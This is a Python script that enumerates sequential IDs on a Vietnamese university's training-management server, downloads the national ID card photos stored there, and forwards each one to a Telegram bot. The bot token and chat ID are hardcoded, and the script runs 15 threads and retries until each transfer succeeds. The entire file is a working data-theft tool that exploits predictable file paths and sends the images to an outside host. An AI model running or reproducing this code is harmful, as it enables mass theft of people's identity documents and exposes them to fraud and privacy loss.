import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

BOT_TOKEN = "6555313021:AAE9QoC-vbIMr93LhBDwKDr0jINafNy0JsE"
CHAT_ID = "5907172438"
MAX = 1000
print_lock = threading.Lock()

def send_to_telegram(image_bytes, filename, sl):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    attempt = 0
    while True:
        attempt += 1
        try:
            files = {"photo": (filename, image_bytes, "image/jpeg")}
            data = {"chat_id": CHAT_ID}
            resp = requests.post(url, files=files, data=data, timeout=15)

            if resp.status_code == 200:
                with print_lock:
                    print(f"[{sl}] ✓ Gửi thành công (lần {attempt})")
                return True

            elif resp.status_code == 429:
                # Rate limit → chờ theo thời gian Telegram yêu cầu
                retry_after = resp.json().get("parameters", {}).get("retry_after", 5)
                with print_lock:
                    print(f"[{sl}] ⚠ Rate limit, chờ {retry_after}s... (lần {attempt})")
                time.sleep(retry_after)

            else:
                with print_lock:
                    print(f"[{sl}] ✗ Lỗi HTTP {resp.status_code}, thử lại sau 3s... (lần {attempt})")
                time.sleep(3)

        except Exception as e:
            with print_lock:
                print(f"[{sl}] ✗ Exception: {e}, thử lại sau 3s... (lần {attempt})")
            time.sleep(3)

def download_and_send(sl):
    # Tải ảnh, retry cho đến khi thành công
    attempt = 0
    while True:
        attempt += 1
        try:
            image = requests.get(f"https://qldaotao.utehy.edu.vn/FileManager/Upload/images/AnhCMND/{sl}_CMND.jpg", timeout=10)
            with print_lock:
                print(f"[{sl}] Download: {image.status_code}")

            if image.status_code == 200:
                send_to_telegram(image.content, f"{sl}.jpg", sl)
                return

            elif image.status_code == 404:
                with print_lock:
                    print(f"[{sl}] ✗ Ảnh không tồn tại (404), bỏ qua")
                return  # 404 thì bỏ qua, không retry

            else:
                with print_lock:
                    print(f"[{sl}] ✗ HTTP {image.status_code}, thử lại sau 3s... (lần {attempt})")
                time.sleep(3)

        except Exception as e:
            with print_lock:
                print(f"[{sl}] ✗ Lỗi tải ảnh: {e}, thử lại sau 3s... (lần {attempt})")
            time.sleep(3)

with ThreadPoolExecutor(max_workers=15) as executor:
    futures = {executor.submit(download_and_send, sl): sl for sl in range(0, MAX)}
    for future in as_completed(futures):
        future.result()
